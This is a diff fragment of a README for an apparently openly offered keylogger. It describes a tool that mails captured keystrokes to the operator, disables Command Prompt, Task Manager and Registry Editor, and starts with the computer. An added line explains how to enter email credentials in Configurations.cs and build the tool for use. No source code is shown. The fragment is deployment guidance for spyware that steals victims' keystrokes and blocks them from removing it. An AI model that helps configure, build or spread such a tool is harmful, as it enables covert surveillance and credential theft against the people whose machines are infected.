@@ -4,8 +4,8 @@ A keylogger that sends the logs to your email with a few more features.
 <h1>Information/How-to:</h1>
 Info: This keylogger is disabling procceses(CMD, Task Manager, Regedit) and launched everytime computer launched. You can DEBUG the keylogger(testing the custom letters) and checking the timeout you can choose to DEBUG:
 <img src="https://cdn.discordapp.com/attachments/734523179409866873/774294110411685928/unknown.png" width="800">
-
-Note: Keylogger can be disabled and activate the procceses by crashing with emailsend timeout or unable to login to the email.
+Note: Keylogger can be disabled and activate the procceses by crashing with emailsend timeout or coudlnt login to the email.
+How-To: After the keylogger is downloaded go KeyLogger.sln and Configurations.cs set your email infos and build it with Release mode your Keylogger is ready.
 <h1>Features:</h1>
 <h2>Raw button mode</h2>
 Ex:
